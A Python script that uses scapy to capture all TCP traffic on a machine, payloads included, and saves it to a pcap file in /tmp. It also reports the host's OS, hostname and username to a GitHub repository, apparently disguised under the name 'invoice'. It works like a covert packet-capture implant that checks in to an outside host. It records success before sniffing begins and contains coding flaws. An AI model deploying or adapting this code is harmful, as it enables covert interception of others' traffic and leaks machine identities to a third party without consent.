import subprocess
import os
from scapy.all import *
import requests
import base64
import getpass
import datetime
import socket

class Log():
    def __init__(self, repository_owner, repository_name, access_token):
        self.repository_owner = repository_owner
        self.repository_name = repository_name
        self.access_token = access_token

    def create_file(self, folder_path, script_name,status):
        # Get the current date and time
        current_datetime = datetime.datetime.now()   

        content = f"Script Name: {script_name}.\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()

        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username

        url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        headers = {
            'Authorization': f'token {self.access_token}',
            'Accept': 'application/vnd.github.v3+json'
        }

        # Check if the file already exists
        existing_file_url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        existing_file_response = requests.get(existing_file_url, headers=headers)
        
        if existing_file_response.status_code == 200:
            # File exists, append the new message to existing content
            existing_file_data = existing_file_response.json()
            sha = existing_file_data['sha']
            existing_content = base64.b64decode(existing_file_data['content']).decode()
            new_content = existing_content + '\n' + content

            data = {
                'message': 'Update log',
                'content': base64.b64encode(new_content.encode()).decode(),
                'sha': sha
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 200:
                print("File updated successfully.")
            else:
                print("Failed to update file:", response.text)
        elif existing_file_response.status_code == 404:
            # File doesn't exist, create a new file
            data = {
                'message': 'New log',
                'content': base64.b64encode(content.encode()).decode()
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 201:
                print("File created successfully.")
            else:
                print("Failed to create file:", response.text)
        else:
            print("Failed to check file existence:", existing_file_response.text)

class Sniffer():
    def __init__(self, script_name):
        self.script_name = script_name
        self.packets = []

    def packet_handler(self, packet):
        destination_directory = "/tmp/results"
        if not os.path.exists(destination_directory):
           os.makedirs(destination_directory)
            
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            output = f"Source IP: {src_ip}  Destination IP: {dst_ip}\n"

            if packet.haslayer(TCP):
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                output += f"Source Port: {src_port}  Destination Port: {dst_port}\n"

                data = packet[TCP].payload
                output += f"Data: {repr(data)}\n"
            
            new_packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port) / Raw(load=str(data))

            self.packets.append(new_packet)    
            wrpcap("/tmp/results/output.pcap", self.packets)
                
    def start_sniffing(self):
        file_creator.create_file("logs", sniffer.script_name,"Script completed successfully")
        sniff(filter="tcp", prn=self.packet_handler)
        
        


repository_owner = 'rsecurity12' 
repository_name = 'invoice' 
access_token = ''  
sniffer = Sniffer('Sniffer')
file_creator = Log(repository_owner, repository_name, access_token)

try:
  sniffer.start_sniffing()
except:
  file_creator.create_file("logs",sniffer.script_name,"Script may have encountered erros")
